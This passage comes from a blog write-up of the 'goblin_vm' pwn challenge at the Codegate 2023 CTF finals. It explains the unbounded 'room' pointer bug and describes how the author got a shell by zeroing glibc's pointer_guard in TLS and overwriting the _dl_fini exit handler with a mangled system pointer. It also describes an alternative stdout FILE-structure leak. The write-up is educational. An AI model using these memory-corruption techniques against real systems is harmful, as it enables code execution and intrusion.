</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">instr6</span>(<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 6 123
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// reg -= 123
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  __nptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtok</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#e6db74">&#34; &#34;</span>);
</span></span><span style="display:flex;"><span>  lVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoll</span>(__nptr);
</span></span><span style="display:flex;"><span>  reg <span style="color:#f92672">=</span> reg <span style="color:#f92672">-</span> lVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">instr7</span>(<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 7 123
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// reg = 123
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>__nptr;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  __nptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtok</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#e6db74">&#34; &#34;</span>);
</span></span><span style="display:flex;"><span>  reg <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoll</span>(__nptr);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">instr8</span>(<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 8 123
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// room += 123
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  __nptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtok</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#e6db74">&#34; &#34;</span>);
</span></span><span style="display:flex;"><span>  lVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoll</span>(__nptr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  room <span style="color:#f92672">=</span> lVar1 <span style="color:#f92672">+</span> room;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">instr9</span>(<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 9 123
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// room -= 123
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  __nptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtok</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#e6db74">&#34; &#34;</span>);
</span></span><span style="display:flex;"><span>  lVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoll</span>(__nptr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  room <span style="color:#f92672">=</span> room <span style="color:#f92672">-</span> lVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">instr10</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>param_1,<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>param_2){
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// a leak
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// a global variable, a stack variable, and a heap variable is set to 1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (((DAT_00104010 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">*</span>param_1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">*</span>param_2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;rax: %ld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,reg);
</span></span><span style="display:flex;"><span>    DAT_00104010 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>param_1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>param_2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So room is essentially $rsp, and reg is essentially $rax.<br>
There are simple push and pop instructions, and instructions to manipulate both the registers. There&rsquo;s also an instruction to print out the value of reg, but it can only be called once. There&rsquo;s 3 booleans, 1 in the .data segment, 1 in the stack, and 1 in the heap, that all become true when the print instruction is called.</p>
<p>The obvious vulnerability here is that there are completely no bounds check on where you can move room. And since room is right above libc, you can easily move room into libc and leak an address, and overwrite libc structures stored in libc memory. You wouldn&rsquo;t need any leaks to do that since room is relative to libc_base, and other libc addresses, meaning that everytime the binary is ran, the offset between room and let&rsquo;s say main_arena is the same. (Assuming you choose the same room size,big/small, everytime.)</p>
<h3 id="exploitation-ideas">Exploitation ideas<a hidden class="anchor" aria-hidden="true" href="#exploitation-ideas">#</a></h3>
<p>You could of course try to overwrite the ret pointer of main and just try to ret2libc, but for that to work you have to move room-&gt;stack, and in order to do that you have to know</p>
<ol>
<li>where room is</li>
<li>where the stack is</li>
</ol>
<p>However, you only have <strong>one</strong> leak.<br>
Technically, you could try to overwrite the global boolean, the stack boolean, and maybe overwrite the heap chunk pointer on the stack so that it points to other memory in order to execute instruction 10 more. But the problem is for that to work you have to leak libc,pie,and stack, which is ultimately what we can&rsquo;t do, and is trying to do.</p>
<p>So you essentially can&rsquo;t move to other sections of memory (like stack, heap, .data etc) since you would need 2 leaks to do that, and can only move around libc memory.</p>
<p>At first I tried the naive idea of overwriting the vtable pointer of the stdout FILE structure in libc <strong>(_IO_2_1_stdout_)</strong>, by leaking a libc address, calculating the address of system, and making my own vtable at the default location of room (where room was initially at in the beginning). But this exploit didn&rsquo;t work, and instead printed out</p>
<p><code>Fatal error: glibc detected an invalid stdio handle</code></p>
<p>as there was a mitigation applied after glibc 2.24, that checks the address of vtable before any virtual functions are called.</p>
<p>I tried googling around and looking for ways to bypass this, and found some writeups, one of which being <a href="https://ctftime.org/writeup/7970">this</a>. But all the writeups seemed quite old, I quickly scrolled through them and I didn&rsquo;t really have much faith on them working on glibc 2.35.</p>
<p>So I went back to square one and kept thinking of other exploitation ideas.</p>
<h3 id="abusing-exit-handlers">Abusing exit handlers<a hidden class="anchor" aria-hidden="true" href="#abusing-exit-handlers">#</a></h3>
<p>I actually first thought about abusing exit handlers after I finished analysing the binary since I explored the technique quite recently. But I thought that that idea wasn&rsquo;t possible since exit() wasn&rsquo;t called, and I quickly dismissed the idea.</p>
<p>After failing to do the vtable overwrite however, I revisited this idea, and wondered whether exit was still called by libc after main returned, and guess what, exit was indeed called.</p>
<blockquote>
<p>If you&rsquo;re not familliar with this technique, I recommend reading this <a href="https://m101.github.io/binholic/2017/05/20/notes-on-abusing-exit-handlers.html">article</a></p>
</blockquote>
<p>Essentially exit() is just a wrapper function for:<br>
<code>__run_exit_handlers (status, &amp;__exit_funcs, true, true);</code></p>
<p>And in libc memory, there is a variable called __exit_funcs, which is an exit_function_list structure. __exit_funcs points to the head of a linked list, that contains multiple exit_function objects. (One linked list element has multiple exit_function objects, when more exit_function objects are required, another linked list element will be created).</p>
<p>When __run_exit_handlers(&hellip;) is called, all the function pointers in the exit_function objects will be called. There are multiple flavors/types of exit_function objects that are all treated slightly differently by __run_exit_handlers(&hellip;), (I recommend reading the article to learn more), but the flavor we&rsquo;re gonna look into is the cxa flavor.</p>
<p>This is because by default, there will be already an exit_function object registered in the list, which contains the function pointer of _dl_fini(), and that exit_function object is of the flavor cxa.</p>
<p>In the libc source code, the definition of the cxa exit_function struct is</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> exit_function
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">int</span> flavor;
</span></span><span style="display:flex;"><span>    ... <span style="color:#75715e">// I redacted a lot of parts for simplicity, read the article for clearer full view
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#66d9ef">struct</span>
</span></span><span style="display:flex;"><span>   {
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>fn) (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg, <span style="color:#66d9ef">int</span> status);
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg;
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>dso_handle;
</span></span><span style="display:flex;"><span>   } cxa;
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>  };
</span></span></code></pre></div><p>In memory, everything looks something like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>0x7ffff7fac838 &lt;__exit_funcs&gt;: 0x00007ffff7fadf00
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>0x00007ffff7fadf00   ‚îÇ+0x0000: 0x0000000000000000
</span></span><span style="display:flex;"><span>0x00007ffff7fadf08   ‚îÇ+0x0008: 0x0000000000000001
</span></span><span style="display:flex;"><span>0x00007ffff7fadf10   ‚îÇ+0x0010: 0x0000000000000004  -
</span></span><span style="display:flex;"><span>0x00007ffff7fadf18   ‚îÇ+0x0018: 0x93b315d57adee436   |--- one exit_function object
</span></span><span style="display:flex;"><span>0x00007ffff7fadf20   ‚îÇ+0x0020: 0x0000000000000000   |
</span></span><span style="display:flex;"><span>0x00007ffff7fadf28   ‚îÇ+0x0028: 0x0000000000000000  -
</span></span><span style="display:flex;"><span>0x00007ffff7fadf30   ‚îÇ+0x0030: 0x0000000000000000
</span></span></code></pre></div><p>As you can see, the _dl_fini function pointer is mangled, this is a mitigation by libc to <em>prevent</em> exit handlers being so easily abused.</p>
<p>The mangling is essentially done with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">// let rdx = function
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">xor</span>     <span style="color:#66d9ef">rdx</span>,<span style="color:#66d9ef">QWORD</span> <span style="color:#66d9ef">PTR</span> <span style="color:#66d9ef">fs</span>:<span style="color:#ae81ff">0x30</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rol</span>     <span style="color:#66d9ef">rdx</span>,<span style="color:#ae81ff">0x11</span>
</span></span></code></pre></div><p>What&rsquo;s inside fs:0x30 is called the <strong>pointer_guard</strong>, which is just 16 random bytes.<br>
When I was reading the <a href="https://m101.github.io/binholic/2017/05/20/notes-on-abusing-exit-handlers.html">article</a>, I questioned what was the fs register used for, and what it was pointing at. A quick google search showed me <a href="https://www.kernel.org/doc/html/next/x86/x86_64/fsgs.html">this</a>, which said that the fs register is used to point at the TLS (Thread Local Storage), which I assume is to store thread information.</p>
<h3 id="back-to-the-challange">Back to the challange<a hidden class="anchor" aria-hidden="true" href="#back-to-the-challange">#</a></h3>
<p>What I could do is just overwrite the _dl_fini exit_function object, with the mangled address of system, and an address to /bin/sh underneath it. But the question is, how can I mangle the address of system?</p>
<p>How the article defeated pointer mangling was by leaking the mangled _dl_fini address, and doing</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span>    ptr_guard <span style="color:#f92672">=</span> ror(ptr_encoded, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">64</span>) <span style="color:#f92672">^</span> _dl_fini
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># this works because</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># _dl_fini = ror(mangled_ptr) ^ ptr_guard</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ptr_guard = _dl_fini ^ ror(mangled_ptr)</span>
</span></span></code></pre></div><p>However for this to work, you would need two leaks, one to leak libc, one to leak the mangled_ptr. Thankfully when I was reading through @nobodyisnobody&rsquo;s <a href="https://github.com/nobodyisnobody">writeup collection</a>, I came across this <a href="https://github.com/nobodyisnobody/write-ups/tree/main/0CTF.TCTF.2022/pwn/ezvm">writeup</a>, which defeated the pointer_guard by overwriting it in the TLS.</p>
<blockquote>
<p>shoutout to <a href="https://github.com/nobodyisnobody">@nobodyisnobody</a> btw, I&rsquo;ve learned quite a bit of stuff from his writeups</p>
</blockquote>
<p>However when I first read this writeup before the ctf, I tried to explore this idea by finding where the TLS is in gdb to look at the object, but everytime I tried to view the fs register</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>gef‚û§  print $fs
</span></span><span style="display:flex;"><span>$1 = 0x0
</span></span></code></pre></div><p>I revisited this idea during the ctf, and thankfully I came across this <a href="https://ctftime.org/writeup/36064">writeup</a>, which printed out the fs register in gdb using</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>gef‚û§  print $fs_base
</span></span><span style="display:flex;"><span>$1 = 0x7ffff7d90740
</span></span></code></pre></div><p>The TLS is in libc memory! So now I can calculate the constant offset from libc base to TLS, and overwrite the pointer_guard to 0. Then I overwrote the mangled _dl_fini address into rol(system,0x11,64), and then wrote the default address of room right underneath it, and put the &ldquo;/bin/sh&rdquo; string at the default location of room.</p>
<p>Exploit worked, and shell popped. Gg.</p>
<h3 id="minor-inconveniences">Minor inconveniences<a hidden class="anchor" aria-hidden="true" href="#minor-inconveniences">#</a></h3>
<p>atoll() is used in the vm&rsquo;s instructions when loading numbers into the reg, so the maximum number you could load was 0x7fffffffffffffff since a signed long is read. This was a problem when I was writing the rol(system), as the addresses were generally &gt; 0x7fffffffffffffff. I got around this by using two writes to write the rol(system) addres. After the ctf, I talked to <a href="https://samuzora.com/">@samuzora</a>, and he had the idea to just use negative numbers to do the write, which is a much cleaner approach compared to mine.</p>
<p>My exploit worked locally, but kept failing remotely. I kept getting:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>timeout: the monitored command dumped core
</span></span><span style="display:flex;"><span>/home/ctf/run.sh: line 2:   <span style="color:#ae81ff">573</span> Illegal instruction     timeout <span style="color:#ae81ff">60</span> /home/ctf/goblin_vm
</span></span></code></pre></div><p>I contacted the organizers and they said that the chall had no problems.</p>
<p>I investigated it using a docker container, and it seems like my libc leaks were inconsistent. Iirc, I was leaking libc addresses from the region at around libc_base+0x219000. I changed my exploit to leak from the default vtable of libc. So note to self, don&rsquo;t leak random libc addresses found in libc next time, leak libc function symbols instead.</p>
<h3 id="another-approach">Another approach<a hidden class="anchor" aria-hidden="true" href="#another-approach">#</a></h3>
<p>I also talked to <a href="https://pepsipu.com/">@pepsipu</a> after the ctf, and he actually solved this chall by overwriting the stdout FILE structure. What he did was enable full buffering on by overwriting the FILE object flags with Or(default flags,0x1800), which tells the stdout object to dump its buffer before printing. He then pops the IO_write_end pointer to reg, add it with 0x7000, then overwrote the IO_write_end pointer with the new value. This will make the IO object to believe the end of the buffer is much further than it actually is.</p>
<p>When printf is called, the IO object will flush the buffer and print out everything between IO_write_base and IO_write_end, and thus leaking everything you&rsquo;ll ever need.</p>
<p>He then just does a simple ret2libc to get shell.</p>
<p>Cool technique.</p>
<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
<p>This was my first ever irl ctf event, and I enjoyed it very much. I met tons of cool skilled people, and got a few cool stickers too. I strongly believe that this is the first to many irl ctfs, and I&rsquo;ll work hard to get stronger and more skillful to make this true.</p>
<p>Thanks to the organizers for holding such a great event, and I hope I can go to more onsite finals soon and meet more cool people soon.</p>
<p><img loading="lazy" src="/codegate23/swag.jpg" alt="swag"  title="test"  />
</p>
<h5 id="epichaxorl337swag1">epicHaxorl337swag!1!<a hidden class="anchor" aria-hidden="true" href="#epichaxorl337swag1">#</a></h5>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://zhirenliew.github.io/tags/pwn/">pwn</a></li>
      <li><a href="https://zhirenliew.github.io/tags/writeups/">writeups</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2025 <a href="https://zhirenliew.github.io">zhiren</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
